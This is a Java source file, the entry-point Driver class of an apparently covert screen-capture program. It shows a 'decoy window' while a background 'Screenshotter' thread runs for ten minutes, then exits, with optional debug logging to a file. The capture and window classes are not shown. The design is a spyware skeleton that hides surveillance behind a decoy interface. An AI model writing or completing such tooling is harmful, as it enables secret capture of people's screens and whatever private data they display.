import java.io.PrintStream;

import javax.swing.JDialog;

public class Driver  {
	/**
	 * Time before program shuts off, in minutes;
	 */
	private static int TIME_UNTIL_SHUTOFF = 10;
	/**
	 * If true, outputs console messages to file "ss_debug.txt"
	 */
	private static boolean DEBUG = false;

	public static void main(String[] args) {
		try {
			if (DEBUG) {
				System.setOut(new PrintStream("ss_debug.txt"));
			}
			//Launches the decoy window
			Window dialog = new Window();
			dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE); //Doesn't kill the program
			dialog.setVisible(true);

			//Launches the screenshot thread
			Screenshotter s = new Screenshotter();
			Thread t = new Thread(s, "Screenshot");
			t.start();

			//Kills the program after the designated amount of time
			Thread.sleep(TIME_UNTIL_SHUTOFF * 60 * 1000);
			System.exit(0);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}